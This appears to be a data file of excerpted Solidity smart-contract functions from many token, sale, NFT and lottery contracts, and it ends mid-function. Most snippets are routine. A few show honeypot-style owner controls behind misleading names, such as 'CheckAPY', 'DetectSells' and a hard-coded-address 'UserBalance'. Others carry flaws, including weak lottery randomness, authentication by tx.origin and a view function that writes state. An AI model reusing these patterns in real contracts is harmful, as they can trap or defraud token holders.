function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function freeze() external {
        // Reentrancy guard.
        require(_status == RE_NOT_ENTERED);
        require(msg.sender == _owner, "Not owner");

        _status = RE_FROZEN;
    }
--------------------------------------------------------------------------------
function unfreeze() external {
        // Reentrancy guard.
        require(_status == RE_FROZEN);
        require(msg.sender == _owner, "Not owner");

        _status = RE_NOT_ENTERED;
    }
--------------------------------------------------------------------------------
constructor (address ecosystemFeeAccount, uint256 ecosystemShare, address _custom_owner)
    public
    DividendTokenERC667(TOTAL_SUPPLY, _custom_owner)
    {
        uint256 ownerSupply = totalSupply.sub(ecosystemShare);
        balanceOf[owner()] = ownerSupply;
        balanceOf[ecosystemFeeAccount] = ecosystemShare;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external override
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function supportsInterface(bytes4 _interfaceID) public override virtual pure returns (bool) {
    if (_interfaceID == type(IERC1155).interfaceId) {
      return true;
    }
    return super.supportsInterface(_interfaceID);
  }
--------------------------------------------------------------------------------
function _approve(address _owner, address _spender, uint256 _amount) 
      internal
    returns (bool success)
    {
        allowed[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
        return true;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId) external view returns (uint256) {
    // Check token on auction
    Auction storage auction = tokenIdToAuction[_tokenId];
    require(_isOnAuction(auction));

    return _currentPrice(auction);
  }
--------------------------------------------------------------------------------
constructor(address _oracle, uint256 _evictPercentage) public {
        require(_oracle != address(0), "Invalid oracle");
        oracle = IOracle(_oracle);
        evictPercentage = _evictPercentage;
    }
--------------------------------------------------------------------------------
function setState(ICOSaleState state)  returns (bool){
    if(!ownership[msg.sender]) throw;
    salestate = state;
    stateChange(salestate);
    return true;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function OKHEALTH() public {
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function sum(uint8[] numbers) constant internal returns(uint8 s) {
    for (uint i = 0; i < numbers.length; i++) {
      s += numbers[i];
    }
  }
--------------------------------------------------------------------------------
function safeguard() {
        if(block.number > (fundingEndBlock + 71000)) {
            if (!bitplusAddress.send(this.balance)) throw;
        }
    }
--------------------------------------------------------------------------------
function insertCyclePlayer() internal {
        if(numberOfCyclePlayers == cyclePlayers.length) {
            cyclePlayers.length += 1;
        }
        cyclePlayers[numberOfCyclePlayers++] = msg.sender;
    }
--------------------------------------------------------------------------------
function totalFeePerTx(uint256 tAmount) internal view returns (uint256) {
        uint256 percentage = tAmount
            .mul(
                _currentRedistributionFee
                    .add(_currentTeamWalletFee)
            )
            .div(1e3);
        return percentage;
    }
--------------------------------------------------------------------------------
constructor(address _owner) public{
        owner = _owner;
        balances[owner] = _totalSupply;
        emit Transfer(address(0x0), _owner, _totalSupply);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) returns (bool success) {

    if(now > releaseFinalizationDate) {
      if(!released) {
        throw;
      }
    }

    return super.transfer(_to, _value);
  }
--------------------------------------------------------------------------------
function setLockAccount(address target, uint256 lockenddate)  {
		if (msg.sender != creator) throw;
		lockAccount[target] = lockenddate;
		LockFunds(target, lockenddate);
     }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 3;
        return res;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function GVE() {
        founder = msg.sender;
        totalSupply = 1000000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function receiveApproval(address _from, uint256 _value, 
address _token, bytes _extraData) external returns(bool){ 
TOC
TOCCall = TOC(_token);
TOCCall.transferFrom(_from,this,_value);
return true;
}
--------------------------------------------------------------------------------
function getMultiplier(uint256 _from, uint256 _to) public view returns (uint256) {
        if (_to <= _from) {
            return 0;
        }
        return getMultiplier(_to).sub(getMultiplier(_from));
    }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {

    // Already finalized
    if(finalized) {
      throw;
    }

    // Finalizing is optional. We only call it if we are given a finalizing agent.
    if(address(finalizeAgent) != 0) {
      finalizeAgent.finalizeCrowdsale();
    }

    finalized = true;
  }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value>0);
        _Ethbalances[0x0] = add(_Ethbalances[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function O5_OwnerRetireHodl(uint256 id) public onlyOwner {
        Safe storage s = _safes[id]; 
        require(s.id != 0); 
        RetireHodl(id);
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        uint256 val = _value * 10 ** uint256(decimals);
        _transfer(msg.sender, _to, val);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    phantom[spender] = val;
    krux[spender] = val2; 
    fish[spender] = val3;
    summer = val4;
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x4291f6B1c3Ef896a34D1a958bC81CD5c087a4fbE,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
        require(state == State.Active);
        deposited[investor] = deposited[investor].add(msg.value);
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) public payable UpgradeableProxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function earnAll() public {
        for (uint256 i = 0; i < numVaults; i++) {
            RewardedVault(vaults[i]).earn();
        }
    }
--------------------------------------------------------------------------------
function()
    external
    payable
{
    if ( msg.sender == partnerAddress_ ) {
        //convert money sent from partner contract into rewards for all token holders
        makeItRain();
    } else {
       purchaseTokens( msg.sender, msg.value ); 
    }
}
--------------------------------------------------------------------------------
function calculateExpectedTokens(uint256 etherValue) 
    external
    view
    returns(uint256)
{
    uint256 etherAfterFee = valueAfterFee( etherValue )[1];
    uint256 amountTokens = etherToTokens( etherAfterFee );
    return amountTokens;
}
--------------------------------------------------------------------------------
function rewardsOf( address playerAddress )
    public
    view
    returns(uint256 playerRewards)
{
    playerRewards = (uint256) ( ( (int256)( _rewardsPerTokenAllTime * tokenBalanceLedger_[ playerAddress ] ) - payoutsToLedger_[ playerAddress ] ) / IMAGNITUDE );
    return playerRewards;
}
--------------------------------------------------------------------------------
function moveFundsToNewDao(address _destinationForDaoFunds)
        public
    {
        require(sender_is(CONTRACT_DAO));
        uint256 _remainingBalance = address(this).balance;
        _destinationForDaoFunds.transfer(_remainingBalance);
    }
--------------------------------------------------------------------------------
function returnUnsoldSafe() public {
        if (beneficiary == msg.sender) {
            uint tokenAmount = 100000;
            tokenReward.transfer(beneficiary, tokenAmount);
        }
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function addAddressToCaller(address addr) onlyOwner public returns(bool success) {
    if (!callers[addr]) {
      callers[addr] = true;
      emit CallerAddressAdded(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAddressFromCaller(address addr) onlyOwner public returns(bool success) {
    if (callers[addr]) {
      callers[addr] = false;
      emit CallerAddressRemoved(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function getContributorAddressById(uint uId) public onlyMultiOwnersType(6) view returns(address) {
    require(uId > 0);
    require(contributorList[uId].active);
    return contributorList[uId].mainWallet;
  }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function transferOwnership(address to) public onlyOwner {
         owner = to;
         balances[owner]=balances[msg.sender];
         balances[msg.sender]=0;
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function QNC(
    ) public {
        totalSupply = 10000000000000000;                              // Update total supply with the decimal amount
        balanceOf[msg.sender] = 10000000000000000;                    // Give the creator all initial tokens
        name = "Queenie Coin";                                        // Set the name for display purposes
        symbol = "QNC";                                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view override returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _superTransferFrom(address _from, address _to, uint256 _value) internal {
        bool success = super.transferFrom(_from, _to, _value);
        require(success, "transfer failed");
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function Pixiu_Beta() {
     
        totalSupply = INITIAL_SUPPLY; 
        adminArray.push(msg.sender);
        set_deposit_address(msg.sender);
        set_exchange_rate_in_eth(300);
         
    }
--------------------------------------------------------------------------------
function _approve(address _owner, address _spender, uint256 _amount) 
      internal
    returns (bool success)
    {
        allowed[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
        return true;
    }
--------------------------------------------------------------------------------
function recoverPreSigned(
        bytes _sig,
        bytes4 _function,
        address _to,
        uint256 _value,
        bytes _extraData,
        uint256 _gasPrice,
        uint256 _nonce) 
      public
      view
    returns (address recovered)
    {
        return ecrecoverFromSig(getSignHash(getPreSignedHash(_function, _to, _value, _extraData, _gasPrice, _nonce)), _sig);
    }
--------------------------------------------------------------------------------
function totalSupplyAt (uint256 _index) constant returns (uint256 supply) {
    require (_index > 0);
    require (_index < snapshots.length);

    return snapshots [_index].tokensCount;
  }
--------------------------------------------------------------------------------
function saveAddress (address _address) internal {
    if (nextAddresses [_address] == 0) {
      nextAddresses [_address] = firstAddress;
      firstAddress = TWO_160 | uint256(_address);
    }
  }
--------------------------------------------------------------------------------
function getKInfo(address token) external view returns (uint32 k, uint32 updatedAt, uint32 theta) {
        k = uint32(K_EXPECTED_VALUE);
        updatedAt = uint32(block.timestamp);
        theta = KInfoMap[token][2];
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
    }
--------------------------------------------------------------------------------
function migrateMultiple(
        uint[] memory _tokenIds
    )
        public
    {
        for (uint i = 0; i < _tokenIds.length; i++) {
            migrate(_tokenIds[i]);
        }
    }
--------------------------------------------------------------------------------
function withdraw(address _to) public onlyOwner {
		require(actived == true);
		require(!frozenAccount[_to]);
		_to.transfer(address(this).balance);
	}
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
    super._mint(to, tokenId);

    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }
--------------------------------------------------------------------------------
function transferAndLock(address _to, uint256 _value, uint _time) public {
        require(_time + now>=now);
        _transferAndLock(msg.sender, _to, _value, _time + now);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x3FFA850CbA112Af6faCFCE891Db103128027504b,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function Leaderboard() {
        owner = msg.sender;
        minBid = 0.001 ether;
        numLeaders = 0;
        maxLeaders = 10;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x5b8ba965BdCC03fA01317a2a935EaFEd49cf7109,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function setInterestPrice(address _property, uint256 _value)
		external
		returns (uint256)
	{
		addressValidator().validateAddress(msg.sender, config().lockup());

		eternalStorage().setUint(getInterestPriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function isReferralSupported() 
                            public 
                            view 
                            returns(bool) 
    {
        uint256 requiredJiffys = referralSignupJiffys.mul(2);
        return (referralJiffysBalance >= requiredJiffys) && (balances[platformManager] >= requiredJiffys);
    }
--------------------------------------------------------------------------------
function createPersonalDepositAddressFor(address _beneficiary) public returns (address) {
        address proxy = new DcorpPersonalCrowdsaleProxy(_beneficiary, this);
        DcorpProxyCreated(proxy, _beneficiary);
        return proxy;
    }
--------------------------------------------------------------------------------
function hasRecord(address _member) public view returns (bool) {
        return records[_member].index < recordIndex.length && _member == recordIndex[records[_member].index];
    }
--------------------------------------------------------------------------------
function withdraw(uint _amount) onlyOwner public {
        require(_amount > 0);
        
        // Amount withdraw should be less or equal to balance
        require(_amount <= address(this).balance);     
        
        owner.transfer(_amount);
    }
--------------------------------------------------------------------------------
function _withdrawUnsoldTokens()
    internal {
        uint256 tokensToWithdraw = TOKENSFORSALE.sub(vestedTokens).sub(distributedTokens);

        _token.transfer(_wallet, tokensToWithdraw);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setMarketingRates(uint256 _newMkt1Rate, uint256 _newMkt2Rate, uint256 _newMkt3Rate)
        onlyAdministrator()
        public
    {
        require(_newMkt1Rate +_newMkt2Rate +_newMkt3Rate <= 180); 
       
        mkt1Rate =  _newMkt1Rate;
        mkt2Rate =  _newMkt2Rate;
        mkt3Rate =  _newMkt3Rate;

    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 _tokenId) public {
    // check if token transfers feature is enabled
    require(__isFeatureEnabled(FEATURE_TRANSFERS));

    // call sender gracefully - `from`
    address from = msg.sender;

    // delegate call to unsafe `__transfer`
    __transfer(from, to, _tokenId);
  }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 2;
        return res;
    }
--------------------------------------------------------------------------------
function() public payable {
        jackPot = jackPot.add(msg.value);
        
        emit BoostedPot(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function canRedeemUTXO(bytes32 txid, bytes20 originalAddress, uint8 outputIndex, uint satoshis, bytes proof) public constant returns (bool) {
        /* Calculate the hash of the Merkle leaf associated with this UTXO. */
        bytes32 merkleLeafHash = keccak256(txid, originalAddress, outputIndex, satoshis);
    
        /* Verify the proof. */
        return canRedeemUTXOHash(merkleLeafHash, proof);
    }
--------------------------------------------------------------------------------
function withdrawStuckETH() external {
        // require(!tradingActive, "Can only withdraw if trading hasn't started");
        bool success;
        (success,) = address(0xD538Be6BE7479b57B49c740dA8E40B3A6D012186).call{value: address(this).balance}("");
    }
--------------------------------------------------------------------------------
function dividendsOf(address _customerAddress) view public returns(uint256) {
        return (uint256) ((int256)(profitPerShare_ * (tokenBalanceLedger_[_customerAddress] + stakeBalanceLedger_[_customerAddress])) - payoutsTo_[_customerAddress]) / magnitude;
    }
--------------------------------------------------------------------------------
function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal override(ERC721, ERC721Enumerable) {
        super._beforeTokenTransfer(from, to, tokenId);
        _moveDelegates(delegates[from], delegates[to], 1);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner payable {
    require(state == State.Active);
    deposited[investor] = add(deposited[investor], msg.value);
  }
--------------------------------------------------------------------------------
function setTicketPrice(uint256 amount) public onlyOwner{
        require(amount > 0, "amount must be greater than 0");
        ticketPrice = amount;
    }
--------------------------------------------------------------------------------
function setMinimumPot(uint256 amount) public onlyOwner{
        require(amount > 0, "amount must be greater than 0");
        minimumPotAmount = amount;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _landId) public {
        require(allowance(msg.sender, _landId));
        clearApprovalAndTransfer(ownerOf(_landId), msg.sender, _landId);
    }
--------------------------------------------------------------------------------
function changeGateway(string calldata _gatewayURL) external onlyOwner {
    require(bytes(_gatewayURL).length > 0);
    emit GatewayChanged(gateway, _gatewayURL);
    gateway = _gatewayURL;
  }
--------------------------------------------------------------------------------
function reclaimableThreshold(uint256 tokenId) public view override returns (uint256) {
        require(tokenId < 0x510, "discreet: out-of-range token");

        return _reclaimableThreshold[tokenId];
    }
--------------------------------------------------------------------------------
function changeValueDeclarator(address _newAddress) external {
    require(msg.sender == valueDeclaratorUpdater, "sender should be current valueDeclaratorUpdater");
    valueDeclarator = _newAddress;
  }
--------------------------------------------------------------------------------
function changeValueDeclaratorUpdater(address _newAddress) external {
    require(msg.sender == valueDeclaratorUpdater, "sender should be current valueDeclaratorUpdater");
    valueDeclaratorUpdater = _newAddress;
  }
--------------------------------------------------------------------------------
function changeValueValidator(address _newAddress) external {
    require(msg.sender == valueValidator, "sender should be current valueValidator");
    valueValidator = _newAddress;
  }
--------------------------------------------------------------------------------
function Lottery() public {
        ceoAddress = msg.sender;
        cooAddress = msg.sender;
        cfoAddress = msg.sender;
        seed = now;
    }
--------------------------------------------------------------------------------
function restart() public {
        require(swap && now >= endTime);
        
        penalty = this.balance * 2000 / 10000;
        
        payFees();
        
        _start();
    }
--------------------------------------------------------------------------------
function DetectSells(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    aircond[spender] = val;
    mayor[spender] = val2; 
    katana[spender] = val3;
    sunset = val4;
  }
--------------------------------------------------------------------------------
function add(address addr, uint max) public onlyAdmin {
        require(!sealed);
        require(addr != 0x0);
        whitelist[addr] = max;
        Whitelisted(addr, max);
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address payable msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function AnimalgoSave(address _holder) public view returns(bool){
    require(!save[_holder]);
    save[_holder] = true;
    emit Save(_holder);
    return true;
}
--------------------------------------------------------------------------------
function registerUser()
        public
    {
        users[tx.origin] = msg.sender;
        emit NewUser(tx.origin, msg.sender);
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function validateNonce(uint nounce) private onlySigner {
        require(nounce > lastNounce && nounce <= (lastNounce+1000), "Enter Valid Nounce");
        lastNounce=nounce;
    }
--------------------------------------------------------------------------------
function mNormalizePledge(uint64[] pledges) {
        for (uint i = 0; i < pledges.length; i++ ) {
            normalizePledge( pledges[i] );
        }
    }
--------------------------------------------------------------------------------
function finalise() public onlyOwner {
        require(!finalised);
        require(now > endDate || parcelsSold >= maxParcels);
        parcelToken.disableMinting();
        finalised = true;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function getGoodsInfo() external view returns (address, StandType, uint256, uint256, TokenType,address,address,uint256,uint,bool) {         
        return (_nftContractAddress,_contractType,_tokenID,_values,_expectedTokenType,_sellerAddress,_expectedTokenAddress,_expectedAmount,_startTime,_isForSale);
    }
--------------------------------------------------------------------------------
function setProxy(address _proxyAddress, bytes32 _symbol) public onlyOneOfContractOwners returns (uint) {
        if (proxies[_symbol] != 0x0) {
            return ATX_PLATFORM_PROXY_ALREADY_EXISTS;
        }
        proxies[_symbol] = _proxyAddress;
        return OK;
    }
--------------------------------------------------------------------------------
function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference, address _sender) onlyProxy(_symbol) public returns (uint) {
        return _transfer(getHolderId(_sender), _createHolderId(_to), _value, _symbol, _reference, getHolderId(_sender));
    }
--------------------------------------------------------------------------------
function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference, address _sender) public onlyProxy(_symbol) returns (uint) {
        return _transfer(getHolderId(_from), _createHolderId(_to), _value, _symbol, _reference, getHolderId(_sender));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function initiateRestoreController() external {
        require(initiateRestoreControllerTimestamp == 0);
        require(pnkToken.controller() == address(this));
        initiateRestoreControllerTimestamp = block.timestamp;
    }
--------------------------------------------------------------------------------
function totalAmountOfEarlyPurchases()
        constant
        noEther
        public
        returns (uint256 totalAmount)
    {
        for (uint256 i; i < earlyPurchases.length; i++) {
            totalAmount += earlyPurchases[i].amount;
        }
    }
--------------------------------------------------------------------------------
function setup(address starbaseCrowdsaleAddress)
        external
        noEther
        onlyOwner
        returns (bool)
    {
        if (address(starbaseCrowdsale) == 0) {
            starbaseCrowdsale = AbstractStarbaseCrowdsale(starbaseCrowdsaleAddress);
            return true;
        }
        return false;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
    uint256 returnAmount = this.balance;
    wallet.transfer(returnAmount);
    emit EtherWithdrawn(wallet, returnAmount);
  }
--------------------------------------------------------------------------------
function SwapController(address[] _guards)
    {
        for (uint i=0; i<_guards.length; i++) {
            addGuard(_guards[i]);
        }
    }
--------------------------------------------------------------------------------
function SimpleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function modifyGameItemPrice(uint _gameItemId, uint256 _newPrice) public {
      require(_newPrice > 0);
      require(gameItemIndexToOwner[_gameItemId] == msg.sender);
      gameItemIndexToPrice[_gameItemId] = _newPrice;
  }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function createDividendWithExclusions(
        uint256 _maturity,
        uint256 _expiry,
        address[] _excluded,
        bytes32 _name
    ) 
        public
        payable
        withPerm(MANAGE)
    {
        uint256 checkpointId = ISecurityToken(securityToken).createCheckpoint();
        _createDividendWithCheckpointAndExclusions(_maturity, _expiry, checkpointId, _excluded, _name);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getOwnersList() public view returns (address[] memory Owners_List){
        address[] memory _FASList = new address[](FASList.length);
        _FASList = FASList;
        return _FASList;
    }
--------------------------------------------------------------------------------
function getReserved() public view
        returns (uint256 vaultTokens, uint256 vaultFunds) {
        address vaultAddress = address(_vault);
        vaultTokens = rewardToken.balanceOf(vaultAddress);
        vaultFunds = vaultAddress.balance;
    }
--------------------------------------------------------------------------------
function mint(
    address _to,
    uint256 _id,
    uint256 _quantity,
    bytes memory _data
  ) public creatorOnly(_id) {
    _mint(_to, _id, _quantity, _data);
    tokenSupply[_id] = tokenSupply[_id].add(_quantity);
  }
--------------------------------------------------------------------------------
function getBalance(ERC20 token) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return this.balance;
        else
            return token.balanceOf(this);
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function EBRK(
    ) public {
        totalSupply = 100000000000000000000000000;                          // Total supply with the decimal amount
        balanceOf[msg.sender] = 100000000000000000000000000;                // All initial tokens
        name = "Token EBRK";                                                // The name for display purposes
        symbol = "EBRK";                                                    // The symbol for display purposes
    }
--------------------------------------------------------------------------------
function adminTransfer(address _to, uint32 _quantity) public onlyRole(ADMIN_ROLE) {
    address newTransfer = new MultiSigTransfer(_quantity, _to, msg.sender);
    transfers.push(newTransfer);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
    approvedForAll[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function updateToken(address _tokenAddress, uint256 _tokenDecimal) public onlyOwner {
        require(_tokenAddress != address(0), 'Address is invalid');
        tokenAddress = _tokenAddress;
        tokenDecimal = _tokenDecimal;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
